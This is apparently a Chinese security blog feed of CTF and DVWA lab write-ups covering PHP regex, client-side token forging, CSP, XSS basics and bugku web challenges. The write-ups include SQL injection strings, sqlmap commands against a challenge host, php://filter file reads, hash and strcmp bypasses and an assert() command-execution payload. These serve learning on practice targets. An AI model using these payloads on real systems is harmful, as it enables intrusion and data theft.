‘o?’。请注意在逗号和两个数之间不能有空格。</td></tr><tr><td><strong>.</strong></td><td><strong>匹配任何字符</strong>，换行符（\n、\r）除外。</td></tr></tbody></table></li><li><p>PHP的正则表达式有一些内置的通用字符簇，列表如下：</p></li></ul><table><thead><tr><th>字符簇</th><th>描述</th></tr></thead><tbody><tr><td>[[:alpha:]]</td><td>任何字母</td></tr><tr><td>[[:digit:]]</td><td>任何数字</td></tr><tr><td>[[:alnum:]]</td><td>任何字母和数字</td></tr><tr><td>[[:space:]]</td><td>任何空白字符</td></tr><tr><td>[[:upper:]]</td><td>任何大写字母</td></tr><tr><td>[[:lower:]]</td><td>任何小写字母</td></tr><tr><td>[[:punct:]]</td><td>任何标点符号</td></tr><tr><td>[[:xdigit:]]</td><td>任何16进制的数字，相当于[0-9a-fA-F]</td></tr></tbody></table><p>sp： php的正则表达式需要放在<code>//</code> 之间</p><p>参考：<a href="https://www.runoob.com/regexp/regexp-tutorial.html">https://www.runoob.com/regexp/regexp-tutorial.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;正则表达式：&quot;&gt;&lt;a href=&quot;#正则表达式：&quot; class=&quot;headerlink&quot; title=&quot;正则表达式：&quot;&gt;&lt;/a&gt;正则表达式：&lt;/h4&gt;&lt;p&gt;描述了一种字符串匹配的模式（pattern），可以用来检查一个串是否含有某种子串、将匹配的子串替换或者从某个</summary>
      
    
    
    
    
    <category term="刷题" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>JS</title>
    <link href="http://example.com/2021/03/18/DVWA%E2%80%94JS/"/>
    <id>http://example.com/2021/03/18/DVWA%E2%80%94JS/</id>
    <published>2021-03-18T10:52:29.000Z</published>
    <updated>2021-03-18T12:19:36.401Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>javascript一种常用于页面代码中，用来实现动态效果的脚本语言。由于JS是存储在客户端，所以过分依赖JS代码逻辑，容易被攻击者获取代码后，进行数据伪造。</p><h1 id="Low："><a href="#Low：" class="headerlink" title="Low："></a>Low：</h1><p>先提交默认数据<img src="/2021/03/18/DVWA%E2%80%94JS/1.png" alt="1"></p><p>提交<code>success</code><img src="/2021/03/18/DVWA%E2%80%94JS/2.png" alt="2"></p><p>无效的token怎么回事呢？查看网页源码</p><p><img src="/2021/03/18/DVWA%E2%80%94JS/3.png" alt="3"></p><p><img src="/2021/03/18/DVWA%E2%80%94JS/4.png" alt="4"></p><p>我们看到token由前端生成，与服务器无关，但是前端的token是根据<code>ChangeMe</code>来生成的，而服务器要的token是根据<code>success</code>生成的。</p><p>利用控制台执行代码</p><p><img src="/2021/03/18/DVWA%E2%80%94JS/5.png" alt="5"></p><p><img src="/2021/03/18/DVWA%E2%80%94JS/6.png" alt="6"></p><p>我们将箭号所指的token的值用上面弹框中的值替换<img src="/2021/03/18/DVWA%E2%80%94JS/7.png" alt="7"></p><h1 id="Medium："><a href="#Medium：" class="headerlink" title="Medium："></a>Medium：</h1><p><a href="http://www.bubuko.com/infodetail-2905900.html">http://www.bubuko.com/infodetail-2905900.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h1&gt;&lt;p&gt;javascript一种常用于页面代码中，用来实现动态效果的脚本语言。由于JS是存储在客户端，所以过分依赖JS代码逻辑，容易被攻击者</summary>
      
    
    
    
    
    <category term="DVWA—labs" scheme="http://example.com/tags/DVWA%E2%80%94labs/"/>
    
  </entry>
  
  <entry>
    <title>CSP</title>
    <link href="http://example.com/2021/03/18/DVWA%E2%80%94CSP/"/>
    <id>http://example.com/2021/03/18/DVWA%E2%80%94CSP/</id>
    <published>2021-03-18T10:40:08.000Z</published>
    <updated>2021-03-18T10:51:44.818Z</updated>
    
    <content type="html"><![CDATA[<p>Content-Security-Policy指的是内容安全检测，又称网页安全政策，CSP的实质就是白名单制度。</p><p>Content-Security-Policy（内容安全策略）是指HTTP返回报文头中的标签，浏览器会根据标签中的内容，判断哪些资源可以加载或执行。是为了缓解潜在的跨站脚本问题（XSS）。原来应对XSS攻击时，主要采用函数过滤、转义输入中的特殊字符、标签、文本来规避攻击。CSP的实质就是白名单制度，开发人员明确告诉客户端，哪些外部资源可以加载和执行。开发者只需要提供配置，实现和执行全部由浏览器完成。简而言之就是在前端添加一些标签，告诉浏览器哪些资源可以加载访问。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Content-Security-Policy指的是内容安全检测，又称网页安全政策，CSP的实质就是白名单制度。&lt;/p&gt;
&lt;p&gt;Content-Security-Policy（内容安全策略）是指HTTP返回报文头中的标签，浏览器会根据标签中的内容，判断哪些资源可以加载或执行</summary>
      
    
    
    
    
    <category term="dvwa—labs" scheme="http://example.com/tags/dvwa%E2%80%94labs/"/>
    
  </entry>
  
  <entry>
    <title>bugku(1)</title>
    <link href="http://example.com/2021/03/16/bugku1/"/>
    <id>http://example.com/2021/03/16/bugku1/</id>
    <published>2021-03-16T14:56:40.000Z</published>
    <updated>2021-04-13T11:55:37.151Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web11：（御剑扫描后端）"><a href="#web11：（御剑扫描后端）" class="headerlink" title="web11：（御剑扫描后端）"></a>web11：（御剑扫描后端）</h1><p> 这题的题目是：网站被黑了 黑客会不会留下后门</p><p>那么我们要借助御剑这个后门扫描工具，扫描目标网站，发现有个shell.php文件<img src="/2021/03/16/bugku1/1.png" alt="1"></p><p>访问shell.php<img src="/2021/03/16/bugku1/2.png" alt="2"></p><p>用bp抓包爆破可知密码为<code>hack</code></p><p><img src="/2021/03/16/bugku1/3.png" alt="3"></p><p>pass为hack，登入<img src="/2021/03/16/bugku1/4.png" alt="4"></p><h1 id="web13：（url解码）"><a href="#web13：（url解码）" class="headerlink" title="web13：（url解码）"></a>web13：（url解码）</h1><p>题目叫我们看看源码，我们看看源码：</p><p><img src="/2021/03/16/bugku1/5.png" alt="5"></p><p>我们对其url解码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSubmit</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> a=document.getElementById(<span class="string">&quot;password&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;undefined&quot;</span>!=typeof a)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;</span>==a.value)</span><br><span class="line">       <span class="keyword">return</span>!<span class="number">0</span>;</span><br><span class="line">       alert(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">       a.focus();</span><br><span class="line">       <span class="keyword">return</span>!<span class="number">1</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line">document.getElementById(<span class="string">&quot;levelQuest&quot;</span>).onsubmit=checkSubmit;</span><br></pre></td></tr></table></figure><p>提交字符串<code>67d709b2b54aa2aa648cf6e87a7114f1</code></p><p><img src="/2021/03/16/bugku1/6.png" alt="6"></p><h1 id="web14：（文件包含加php-filter）"><a href="#web14：（文件包含加php-filter）" class="headerlink" title="web14：（文件包含加php://filter）"></a>web14：（文件包含加php://filter）</h1><p>进入题目，看到<img src="/2021/03/16/bugku1/15.png" alt="15"></p><p>点击<code>click me？ no</code>跳转<img src="/2021/03/16/bugku1/16.png" alt="16"></p><p>发现是文件包含题。</p><ul><li><strong>补充</strong></li></ul><ol><li>include()函数对文件后缀名无要求，而对其中的语法有要求，即使后缀名为txt，jpg也会被当做php文件解析，只要文件内是<?php ?>形式就可以执行，但是如果不是php语法的形式，即使后缀为php，也无法执行。</li><li><strong>php://filter</strong> 设计用来过滤筛选文件。如果想要读取运行php文件的源码，需要先对该php文件内容base64编码，再传入include函数，这样就不会被认为是php代码，不会执行，会输出文件的base64编码，后续再解码即可获得源码。</li></ol><p>故本题payload为：<code>php://filter/read=convert.base64-encode/resource=index.php</code></p><p><img src="/2021/03/16/bugku1/17.png" alt="17"></p><p>base64解码：<img src="/2021/03/16/bugku1/18.png" alt="18"></p><p>参考博客:</p><p><code>https://blog.csdn.net/zpy1998zpy/article/details/80598768</code></p><p><code>https://www.freebuf.com/column/148886.html</code></p><h1 id="web16：（MD5-函数绕过）"><a href="#web16：（MD5-函数绕过）" class="headerlink" title="web16：（MD5()函数绕过）"></a>web16：（MD5()函数绕过）</h1><p>进入环境后发现就一串数字，其他什么也没有，检查网页源码，抓包看回显都没有什么线索，又用御剑扫描网页后台</p><p><img src="/2021/03/16/bugku1/7.png" alt="7"></p><p>发现一个.bak拓展名（bak这种备份文件在我们平常使用绘图、编程软件时都会默认创建备份文件，如cad文件修改后会产生bak文件，wps、word等文件修改后也都会产生bak备份文件，这样可以保证当源文件不小心被删掉或者出现故障导致无故自动退出时，还可以从bak备份文件继续编辑，减少了不少误操作带来的损失。）的文件，结合描述的信息：备份是个好习惯，我们可以猜测这个.bak拓展名文件应该有东西</p><p>下载文件并打开<img src="/2021/03/16/bugku1/35@%25PWPHHUMJX79WMRZM%5B_5.png" alt="img"></p><p>我们可以看到key1和key2本身不能相等，但是被md5编码后两者要相等才能得到flag。</p><p>总的来说这是一道文件包含漏洞+绕过字符串过滤+绕过md5编码的题</p><p>我们用双写绕过字符串过滤，利用md5()函数无法处理数组（如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。）达成if条件。</p><p>因此我们的payload是<code>?kekeyy1[]=1&amp;kekeyy2[]=2</code></p><p><img src="/2021/03/16/bugku1/8.png" alt="8"></p><h1 id="web17-sql注入——post型"><a href="#web17-sql注入——post型" class="headerlink" title="web17:(sql注入——post型)"></a>web17:(sql注入——post型)</h1><h3 id="1-手工注入："><a href="#1-手工注入：" class="headerlink" title="1.手工注入："></a>1.手工注入：</h3><p>查数字段值：0’ union select 1,2,3,4#</p><p>爆库：0’ union select 1,2,3,database()#</p><p>爆表：0’ union select 1,2,3,group_concat(table_name) from information_schema.talbes where table_schema=’skctf’#</p><p>爆列：0’ union select 1,2,3,group_concat(column_name) from information_schema.tables where table_name=fl4g#</p><p>爆值：0’ union select 1,2,3,skctf_flag form fl4g#</p><h3 id="2-sqlmap"><a href="#2-sqlmap" class="headerlink" title="2.sqlmap"></a>2.sqlmap</h3><p>爆库：<code>sqlmap.py -u &quot;http://114.67.246.176:12115&quot; --batch --data &quot;id=1&quot; --current-db</code></p><p>爆表：<code>sqlmap.py -u &quot;http://114.67.246.176:12115&quot; --batch --data &quot;id=1&quot; -D skctf --tables</code></p><p>爆列：<code>sqlmap.py -u &quot;http://114.67.246.176:12115&quot; --batch --data &quot;id=1&quot; -D skctf -T fl4g --columns</code></p><p>爆值：<code>sqlmap.py -u &quot;http://114.67.246.176:12115&quot; --batch --data &quot;id=1&quot; -D skctf -T fl4g -C skctf_flag --dump </code></p><h1 id="Web20（line控制返回内容）"><a href="#Web20（line控制返回内容）" class="headerlink" title="Web20（line控制返回内容）"></a>Web20（line控制返回内容）</h1><p>打开题目地址发现是一堆乱码，我还以为乱码里面有内容，分析了一通，结果什么也没有。</p><p>注意到url栏filename的值好像被编码了，base64解码得keys.txt。<img src="/2021/03/16/bugku1/12.png" alt="12"></p><ul><li>变量line的值为多少就返回指定文件中第几行，无值时默认返回第0行</li></ul><p>一般index.php都会存在源码，编码index.php</p><p><img src="/2021/03/16/bugku1/13.png" alt="13"></p><p>返回index.php第一行源码，只要不断更改line的值最终就可以获得完整的index.php源码（因为我不会写python脚本）</p><p>index.php源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file=base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;filename&#x27;</span>])?$_GET[<span class="string">&#x27;filename&#x27;</span>]:<span class="string">&quot;&quot;</span>);</span><br><span class="line">$line=<span class="keyword">isset</span>($_GET[<span class="string">&#x27;line&#x27;</span>])?intval($_GET[<span class="string">&#x27;line&#x27;</span>]):<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>($file==<span class="string">&#x27;&#x27;</span>) header(<span class="string">&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;</span>);</span><br><span class="line">$file_list = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;0&#x27;</span> =&gt;<span class="string">&#x27;keys.txt&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;1&#x27;</span> =&gt;<span class="string">&#x27;index.php&#x27;</span>,</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;margin&#x27;</span>]) &amp;&amp; $_COOKIE[<span class="string">&#x27;margin&#x27;</span>]==<span class="string">&#x27;margin&#x27;</span>)&#123;</span><br><span class="line">$file_list[<span class="number">2</span>]=<span class="string">&#x27;keys.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(in_array($file, $file_list))&#123;</span><br><span class="line">$fa = file($file);</span><br><span class="line"><span class="keyword">echo</span> $fa[$line];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们看到当cookie内容为参数margin=margin时，file_list数组会多一个键值<code>keys.php</code>，然后通过in_array函数检测我们上传的文件名是否在file_list数组中，是则发送key.php文件的内容。</p><p>因此我们构造cookie：margin=margin，令filename的值为key.php  base64编码后的值。<img src="/2021/03/16/bugku1/14.png" alt="14"></p><h1 id="web21：（编码-加条件绕过）"><a href="#web21：（编码-加条件绕过）" class="headerlink" title="web21：（编码+加条件绕过）"></a>web21：（编码+加条件绕过）</h1><p>打开题目地址做的第一件就是查看网页源码<img src="/2021/03/16/bugku1/9.png" alt="9"></p><p>发现有一个1p.html文件，打开是一段HTML代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">HEAD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">LANGUAGE</span>=<span class="string">&quot;Javascript&quot;</span>&gt;</span></span><br><span class="line">&lt;!--</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> Words =<span class="string">&quot;%3Cscript%3Ewindow.location.href%3D&#x27;http%3A%2F%2Fwww.bugku.com&#x27;%3B%3C%2Fscript%3E%20%0A%3C!--JTIyJTNCaWYoISUyNF9HRVQlNUInaWQnJTVEKSUwQSU3QiUwQSUwOWhlYWRlcignTG9jYXRpb24lM0ElMjBoZWxsby5waHAlM0ZpZCUzRDEnKSUzQiUwQSUwOWV4aXQoKSUzQiUwQSU3RCUwQSUyNGlkJTNEJTI0X0dFVCU1QidpZCclNUQlM0IlMEElMjRhJTNEJTI0X0dFVCU1QidhJyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJ2InJTVEJTNCJTBBaWYoc3RyaXBvcyglMjRhJTJDJy4nKSklMEElN0IlMEElMDllY2hvJTIwJ25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJyUzQiUwQSUwOXJldHVybiUyMCUzQiUwQSU3RCUwQSUyNGRhdGElMjAlM0QlMjAlNDBmaWxlX2dldF9jb250ZW50cyglMjRhJTJDJ3InKSUzQiUwQWlmKCUyNGRhdGElM0QlM0QlMjJidWdrdSUyMGlzJTIwYSUyMG5pY2UlMjBwbGF0ZWZvcm0hJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuKCUyNGIpJTNFNSUyMGFuZCUyMGVyZWdpKCUyMjExMSUyMi5zdWJzdHIoJTI0YiUyQzAlMkMxKSUyQyUyMjExMTQlMjIpJTIwYW5kJTIwc3Vic3RyKCUyNGIlMkMwJTJDMSkhJTNENCklMEElN0IlMEElMDklMjRmbGFnJTIwJTNEJTIwJTIyZmxhZyU3QioqKioqKioqKioqJTdEJTIyJTBBJTdEJTBBZWxzZSUwQSU3QiUwQSUwOXByaW50JTIwJTIybmV2ZXIlMjBuZXZlciUyMG5ldmVyJTIwZ2l2ZSUyMHVwJTIwISEhJTIyJTNCJTBBJTdEJTBBJTBBJTBBJTNGJTNF--%3E&quot;</span> </span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">OutWord</span>(<span class="params"></span>)</span></span></span><br><span class="line">&#123;</span><br><span class="line"><span class="javascript"><span class="keyword">var</span> NewWords;</span></span><br><span class="line"><span class="javascript">NewWords = <span class="built_in">unescape</span>(Words);</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.write(NewWords);</span></span><br><span class="line">&#125; </span><br><span class="line">OutWord();</span><br><span class="line"><span class="javascript"><span class="comment">// --&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HEAD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">BODY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">BODY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HTML</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们看到word一大串字符串很可疑，结合后面的unescape()函数，断定这里被编码了</p><p>用burp解码，顺序为：url解码，base64解码，再url解码</p><p><img src="/2021/03/16/bugku1/10.png" alt="10"></p><p>最终得</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--<span class="string">&quot;;if(!<span class="subst">$_GET</span>[&#x27;id&#x27;])</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">header(&#x27;Location: hello.php?id=1&#x27;);</span></span><br><span class="line"><span class="string">exit();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"><span class="subst">$id</span>=<span class="subst">$_GET</span>[&#x27;id&#x27;];</span></span><br><span class="line"><span class="string"><span class="subst">$a</span>=<span class="subst">$_GET</span>[&#x27;a&#x27;];</span></span><br><span class="line"><span class="string"><span class="subst">$b</span>=<span class="subst">$_GET</span>[&#x27;b&#x27;];</span></span><br><span class="line"><span class="string">if(stripos(<span class="subst">$a</span>,&#x27;.&#x27;))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">echo &#x27;no no no no no no no&#x27;;</span></span><br><span class="line"><span class="string">return ;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"><span class="subst">$data</span> = @file_get_contents(<span class="subst">$a</span>,&#x27;r&#x27;);</span></span><br><span class="line"><span class="string">if(<span class="subst">$data</span>==&quot;</span>bugku is a nice plateform!<span class="string">&quot; and <span class="subst">$id</span>==0 and strlen(<span class="subst">$b</span>)&gt;5 and eregi(&quot;</span><span class="number">111</span><span class="string">&quot;.substr(<span class="subst">$b</span>,0,1),&quot;</span><span class="number">1114</span><span class="string">&quot;) and substr(<span class="subst">$b</span>,0,1)!=4)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string"><span class="subst">$flag</span> = &quot;</span>flag&#123;***********&#125;<span class="string">&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">print &quot;</span>never never never give up !!!<span class="string">&quot;;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;--&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>file_get_contents() 函数：把整个文件读入一个字符串中。</p></li><li><p>eregi()</p><p>作用：不分大小写的正则表达式匹配——在 <code>string</code> 中寻找与给定的正则表达式 <code>pattern</code> 所匹配的子串。</p><p>语法：ereg ( string <code>$pattern</code> , string <code>$string</code> , array <code>&amp;$regs</code> = ? ) </p></li></ul><p>代码审计：当id为空时，网页自动跳转到指定文件；参数<code>a</code>中不得有<code>.</code>，否则输出‘no’（这限制了我们直接导入文件）；接着将a的值赋值给参数data；if条件规定：data的值为<code>bugku is a nice plateform!</code>，id的值为0，b值的长度大于5，然后<code>111</code>和b值的第一个字符结合与<code>1114</code>进行匹配，并且b值的第一个字符不能是4。</p><p>ereg和eregi的截断漏洞：%00截断及遇到%00则默认为字符串的结束。因此我们构造b=%0023456</p><p>php中会把id=0当成id=nothing，也就是空白。那么这题<code>!$_GET[&#39;id&#39;]</code>和<code>$id==0</code>明显冲突矛盾，这时我们要想到PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。因此我们可以构造：<code>?id=0e1</code></p><p>由于if条件规定：data的值为<code>bugku is a nice plateform!</code>因此我们可以利用php://input获取post上传数据的特点，</p><p>令<code>?a=php://input</code>并post数据<code>bugku is a nice plateform!</code></p><p>综上所述：payload=?id=0e1&amp;a=php://input&amp;b=%0023456 并post数据<code>bugku is a nice plateform!</code></p><p><img src="/2021/03/16/bugku1/11.png" alt="11"></p><h1 id="web22（assert-函数漏洞利用）"><a href="#web22（assert-函数漏洞利用）" class="headerlink" title="web22（assert()函数漏洞利用）"></a>web22（assert()函数漏洞利用）</h1><p>点开题目发现题目描述那段话：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$poc&#x3D;&quot;a#s#s#e#r#t&quot;; </span><br><span class="line">$poc_1&#x3D;explode(&quot;#&quot;,$poc);  </span><br><span class="line">$poc_2&#x3D;$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5];  </span><br><span class="line">$poc_2($_GET[&#39;s&#39;])</span><br></pre></td></tr></table></figure><p> 以上代码最终等价执行语句：<code>assert($_GET[&#39;s&#39;])</code></p><p>补充：assert()函数会将括号内的字符串当作php代码执行。</p><p>详情参考：<code>https://www.smi1e.top/%E6%B5%85%E8%B0%88eval%E5%92%8Cassert/</code></p><p>那么我们可以根据assert()函数的特性，构造payload：<code>?s=system(ls)或?s=system(dir)</code></p><p><img src="/2021/03/16/bugku1/19.png" alt="19"></p><p>访问<code>flaga15808abee46a1d5.txt</code>，得flag</p><h1 id="web23：（正则表达式）"><a href="#web23：（正则表达式）" class="headerlink" title="web23：（正则表达式）"></a>web23：（正则表达式）</h1><p>打开题目地址：<img src="/2021/03/16/bugku1/21.png" alt="21"></p><p>我们看到一个正则表达式：<code>/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i</code>，当我们输入的id值满足正则匹配是会输出flag</p><p>我们可以把这个正则表达式拆分成：<code>key</code> <code>.</code> <code>*</code> <code>key</code> <code>.&#123;4,7&#125;</code> <code>key</code> <code>:</code> <code>/</code> <code>.</code> <code>/</code> <code>.</code> <code>*</code> <code>key</code> <code>[a-z]</code> <code>[[:punct:]]</code></p><p>分析（从左到右）：</p><p><code>key</code>——就是key</p><p><code>.</code> ——任意字符</p><p><code>*</code>——匹配前面的子表达式零次或多次</p><p><code>key</code>——就是key</p><p><code>.&#123;4,7&#125;</code>——匹配任意字符4到7次</p><p><code>key</code>——就是key</p><p><code>:</code>——就是<code>:</code></p><p><code>/</code>——就是<code>/</code></p><p><code>.</code> ——任意字符</p><p><code>/</code>——就是<code>/</code></p><p><code>.</code> ——任意字符</p><p><code>*</code>——匹配前面的子表达式零次或多次</p><p><code>key</code>——就是key</p><p><code>[a-z]</code>——匹配a-z之间的字母</p><p><code>[[:punct:]]</code>——匹配任意标点符号</p><p>依次我们构造payload，以get的方式传参id：<code>?id=key1key1111key:/1/1keya!</code>     （payload不唯一）</p><h1 id="web24：（md5绕过-strcmp函数绕过）"><a href="#web24：（md5绕过-strcmp函数绕过）" class="headerlink" title="web24：（md5绕过+strcmp函数绕过）"></a>web24：（md5绕过+strcmp函数绕过）</h1><p>打开题目地址，查看源码：<img src="/2021/03/16/bugku1/Users/Lenovo\Desktop\blog\hexo\source_posts\bugku\22.png" alt="22"></p><p>点开code.txt<img src="/2021/03/16/bugku1/Users/Lenovo\Desktop\blog\hexo\source_posts\bugku\23.png" alt="23"></p><p>我们看到有三个参数：v1,v2,v3</p><p>要满足条件：</p><p>1.<code>v1!=v2</code></p><p>2.<code>md5(v1)=mad5(v2)</code></p><p>3.<code>v3的值等于flag</code></p><ul><li>绕条件1,2</li></ul><p>法1：通过数组绕过md5函数加密，如<code>v1[]=1,v2[]=2</code></p><p>法2：利用php弱口令特性，会将0e开头的哈希值都解析为0。常见的md5加密后以0e开头的字符串：240610708、QNKCDZO、aabg7XSs、aabC9RqS等</p><ul><li>绕过条件3</li></ul><p>利用strcmp函数不能比较数组（比较数组返回为空，及零），构造v3[]=flag</p><p><strong>综上，构造flag：</strong><code>?v1[]=1&amp;v2[]=2&amp;v3[]=flag</code>或<code>?v1=240610708&amp;v2=QNKCDZO&amp;v3[]=flag</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;web11：（御剑扫描后端）&quot;&gt;&lt;a href=&quot;#web11：（御剑扫描后端）&quot; class=&quot;headerlink&quot; title=&quot;web11：（御剑扫描后端）&quot;&gt;&lt;/a&gt;web11：（御剑扫描后端）&lt;/h1&gt;&lt;p&gt; 这题的题目是：网站被黑了 黑客会不会留下后</summary>
      
    
    
    
    
    <category term="bugku" scheme="http://example.com/tags/bugku/"/>
    
  </entry>
  
  <entry>
    <title>DVWA—XSS</title>
    <link href="http://example.com/2021/03/13/DVWA%E2%80%94XSS/"/>
    <id>http://example.com/2021/03/13/DVWA%E2%80%94XSS/</id>
    <published>2021-03-13T02:35:57.000Z</published>
    <updated>2021-03-15T14:52:58.591Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>—）XSS的中文名称叫跨站脚本，是WEB漏洞中比较常见的一种，特点就是可以将恶意HTML/JavaScript代码注入到受害用户浏览的网页上，从而达到劫持用户会话的目的。实际应用中xss可以完成很多操作，这里举两个例子。</p><ul><li><strong>窃取网页浏览中的cookie值</strong></li></ul><p>在网页浏览中我们常常涉及到用户登录，登录完毕之后服务端会返回一个cookie值。这个cookie值相当于一个令牌，拿着这张令牌就等同于证明了你是某个用户。</p><p>如果你的cookie值被窃取，那么攻击者很可能能够直接利用你的这张令牌不用密码就登录你的账户。如果想要通过script脚本获得当前页面的cookie值，通常会用到document.cookie。</p><p>试想下如果像空间说说中能够写入xss攻击语句，那岂不是看了你说说的人的号你都可以登录（不过某些厂商的cookie有其他验证措施如：Http-Only保证同一cookie不能被滥用）</p><ul><li><strong>劫持流量实现恶意跳转</strong></li></ul><p>这个很简单，就是在网页中想办法插入一句像这样的语句：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">window</span>.location.href=<span class="string">&quot;http://www.baidu.com&quot;</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>那么所访问的网站就会被跳转到百度的首页。【摘自<a href="https://zhuanlan.zhihu.com/p/26177815%E3%80%91">https://zhuanlan.zhihu.com/p/26177815】</a></p><p>—）XSS根据恶意脚本的传递方式可以分为3种，分别为反射型、存储型、DOM型，前面两种恶意脚本都会经过服务器端然后返回给客户端，相对DOM型来说比较好检测与防御，而DOM型不用将恶意脚本传输到服务器在返回客户端。</p><ul><li><p><strong>DOM-based XSS：</strong>漏洞是基于文档对象模型Document Objeet 